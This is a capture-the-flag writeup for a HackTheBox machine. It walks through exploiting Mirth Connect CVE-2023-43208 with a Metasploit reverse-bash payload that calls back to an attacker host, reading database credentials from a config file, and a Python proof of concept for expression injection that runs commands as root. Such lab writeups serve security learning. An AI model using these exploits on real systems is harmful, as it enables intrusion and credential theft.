---
layout: post
title:  "Interpreter"
date:   2026-03-04 10:30:00 -0400
categories: HTB-machine linux medium
tags: HTB CTF writeup 
image:
    #path: assets/img/htb/interpreter/banner.png
---

## 1/ Reconnaissance

### 1.1 Port and service enumeration

```
nmap -Pn -sC -sV 10.129.244.184

22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
```

### 1.2 Confirm Mirth Connect version leak

```
curl -sk https://10.129.244.184/webstart.jnlp | head -n 40

... Mirth Connect 4.4.0 ...
```

## 2/ Initial Foothold (CVE-2023-43208)

### 2.1 Metasploit resource script

Using `Metaploit`:

```
use exploit/multi/http/mirth_connect_cve_2023_43208
set RHOSTS 10.129.244.184
set RPORT 443
set SSL true
set LHOST [Attacker IP]
set PAYLOAD cmd/unix/reverse_bash
set VERBOSE true
run
```

Run it:

```
msfconsole -q -r msf_cve_2023_43208.rc
```

### 2.2 Verify foothold

In obtained shell:

```
id

uid=103(mirth) gid=103(mirth) groups=103(mirth)
```

## 3/ Enumeration as `mirth`

### 3.1 Listening local services

```
ss -lntp

LISTEN 0 128 127.0.0.1:54321 ...
```

### 3.2 Extract Mirth DB credentials
```
cat /usr/local/mirthconnect/conf/mirth.properties | rg "database\.(username|password)"

database.username = mirthdb
database.password = MirthPass123!
```

### 3.3 Validate internal endpoint behavior

```bash
curl -s http://127.0.0.1:54321/addPatient
```

## 4/ Privilege Escalation via `/addPatient` Expression Injection

### 4.1 Generic expression-eval

```python
#!/usr/bin/env python3
# /home/x/Downloads/poc/addpatient_eval_poc.py
import argparse
import json
import sys
import requests


def build_xml(firstname: str) -> str:
    return f"""<?xml version='1.0' encoding='UTF-8'?>
<patient>
  <firstname>{firstname}</firstname>
  <lastname>tester</lastname>
  <dob>1990-01-01</dob>
  <ssn>111-22-3333</ssn>
</patient>
"""


def main() -> int:
    parser = argparse.ArgumentParser(description="PoC for addPatient expression evaluation")
    parser.add_argument("--url", required=True, help="Target URL, e.g. http://127.0.0.1:54321/addPatient")
    parser.add_argument("--expr", required=True, help="Expression body to place inside {...}")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    payload = "{" + args.expr + "}"
    xml_data = build_xml(payload)
    headers = {"Content-Type": "application/xml"}

    try:
        r = requests.post(args.url, data=xml_data.encode(), headers=headers, timeout=args.timeout)
    except requests.RequestException as exc:
        print(f"[!] Request failed: {exc}", file=sys.stderr)
        return 1

    print(f"[+] HTTP {r.status_code}")
    print("[+] Response body:")
    print(r.text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### 4.2 Exploit with the script

```
python3 /home/x/Downloads/poc/addpatient_eval_poc.py \
  --url http://127.0.0.1:54321/addPatient \
  --expr 'os.popen("id").read()'

[+] HTTP 200
[+] Response body:
uid=0(root) gid=0(root) groups=0(root)
```
